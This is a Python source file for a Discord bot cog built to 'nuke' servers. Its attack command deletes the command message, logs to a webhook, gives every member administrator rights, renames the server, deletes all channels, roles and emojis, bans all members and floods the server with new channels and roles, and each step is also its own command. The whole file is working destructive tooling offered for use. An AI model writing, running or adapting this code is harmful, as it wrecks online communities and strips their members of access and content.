# coding: utf-8
import os
import json
import time
import aiohttp
import asyncio
import discord
import subprocess
import datetime
from utils import *
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Classic(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Automatic server destruction
    @commands.command(aliases=['auto', 'nuke', 'crash'])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def attack(self, ctx):
        try:
            try:
                await ctx.message.delete()
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(loghook_send(ctx, loghook))
            except Exception as e: print(e)

            try:
                self.client.loop.create_task(everyone_admins(ctx)) # Give administrator rights to all participants.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(r3name(ctx)) # Changing the server name and avatar.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(deleting_channels(ctx)) # Deleting all channels.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(creating_channels(ctx)) # Mass creation of channels.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(deleting_roles(ctx)) # Deleting all roles.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(emoji_deleting(ctx)) # Deleting all emojis.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(ban_all(ctx)) # Ban all members.
            except Exception as e: print(e)
            try:
                self.client.loop.create_task(creating_roles(ctx)) # Mass creation of roles.
            except Exception as e: print(e)
        except Exception as e: print(e)


    # Deleting all roles.
    @commands.command(aliases=["delr", "del_roles", "delete_roles", "del_role", "delete_role"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def delroles(self, ctx):
        try:
            tic = time.perf_counter()
            await ctx.message.delete()

            start_count_roles = len(ctx.guild.roles)
            delete_roles_count = 0

            for role in ctx.guild.roles:
                try:
                    delete_roles_count += 1
                    await role.delete()
                except:
                    try:
                        delete_roles_count += 1
                        await role.delete()
                    except:
                        pass
            toc = time.perf_counter()
            end_time = f"{toc - tic:0.4f}"

            self.client.loop.create_task(statistics(
                                            ctx, start=start_count_roles, count=delete_roles_count, 
                                            name="roles", time=end_time, stat_type="delete"))
        except Exception as e: print(e)



    # Deleting all channels.
    @commands.command()
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def delchannels(self, ctx):
        try:
            tic = time.perf_counter()
            await ctx.message.delete()

            start_count_channels = len(ctx.guild.channels)
            delete_channels_count = 0

            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    delete_channels_count += 1
                except:
                    try:
                        delete_channels_count += 1
                        await channel.delete()
                    except:
                        pass
            toc = time.perf_counter()
            end_time = f"{toc - tic:0.4f}"

            self.client.loop.create_task(statistics(
                                            ctx, start=start_count_channels, count=delete_channels_count, 
                                            name="channels", time=end_time, stat_type="delete"))
        except Exception as e: print(e)


    # Mass creation of channels.
    @commands.command(aliases=["spam_channels", "s_channels", "spam_c", "spam_chan", "s_chan"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def channels(self, ctx, channel_type="text"):
        try:
            tic = time.perf_counter()
            await ctx.message.delete()

            create_channels_count = 0

            try:
                if channel_type == "text":
                    for i in range(100):
                        await ctx.guild.create_text_channel(nuke_channels_name)
                        create_channels_count += 1
                elif channel_type == "voice":
                    for i in range(100):
                        await ctx.guild.create_voice_channel(nuke_voice_name)
                        create_channels_count += 1
                elif channel_type == "category":
                    for i in range(100):
                        await ctx.guild.create_category_channel(nuke_categories_name)
                        create_channels_count += 1
                else:
                    try:
                        self.client.loop.create_task(creating_channels(ctx))
                    except:
                        try:
                            self.client.loop.create_task(creating_channels(ctx))
                        except:
                            pass
            except:
                if channel_type == "text":
                    for i in range(100):
                        await ctx.guild.create_text_channel(nuke_channels_name)
                        create_channels_count += 1
                elif channel_type == "voice":
                    for i in range(100):
                        await ctx.guild.create_voice_channel(nuke_voice_name)
                        create_channels_count += 1
                elif channel_type == "category":
                    for i in range(100):
                        await ctx.guild.create_category_channel(nuke_categories_name)
                        create_channels_count += 1
                else:
                    try:
                        self.client.loop.create_task(creating_channels(ctx))
                    except:
                        try:
                            self.client.loop.create_task(creating_channels(ctx))
                        except:
                            pass

            toc = time.perf_counter()
            end_time = f"{toc - tic:0.4f}"

            self.client.loop.create_task(statistics(
                                            ctx, start=None, count=create_channels_count, 
                                            name="channels", time=end_time, stat_type="create"))
        except Exception as e: print(e)


    # Mass creation of roles.
    @commands.command(aliases=["role_spam", "roles_spam", "r_spam", "rs_spam", "r_s", "rs_s"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def roles(self, ctx):
        try:
            tic = time.perf_counter()
            await ctx.message.delete()

            create_roles_count = 0

            for i in range(100):
                try:
                    await ctx.guild.create_role(name=nuke_roles_name)
                except:
                    try:
                        await ctx.guild.create_role(name=nuke_roles_name)
                    except:
                        pass
            toc = time.perf_counter()
            end_time = f"{toc - tic:0.4f}"

            self.client.loop.create_task(statistics(
                                            ctx, start=None, count=create_roles_count, 
                                            name="roles", time=end_time, stat_type="create"))
        except Exception as e: print(e)


    # Deleting all emojis.
    @commands.command(aliases=["del_emoji", "delete_emoji", "d_emoji", "d_e"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def delemoji(self, ctx):
        try:
            tic = time.perf_counter()
            await ctx.message.delete()

            start_count_emojis = len(ctx.guild.emojis)
            delete_emojis_count = 0

            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    delete_emojis_count += 1
                except:
                    try:
                        await emoji.delete()
                        delete_emojis_count += 1
                    except:
                        pass

            toc = time.perf_counter()
            end_time = f"{toc - tic:0.4f}"

            self.client.loop.create_task(statistics(
                                            ctx, start=start_count_emojis, count=delete_emojis_count, 
                                            name="emoji", time=end_time, stat_type="delete"))
        except Exception as e: print(e)


    # Changing the server name and avatar.
    @commands.command(aliases=["set_name", "set_server", "rename_server", "rename_guild", "r_server", "r_guild", "rn"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, command_cooldown_time, commands.BucketType.user)
    async def rename(self, ctx):
        try:
            await ctx.message.delete()

            with open(nuke_avatar_file, 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(icon=icon)
            await ctx.guild.edit(name=nuke_server_name)
        except Exception as e: print(e)


async def setup(client):
    await client.add_cog(Classic(client))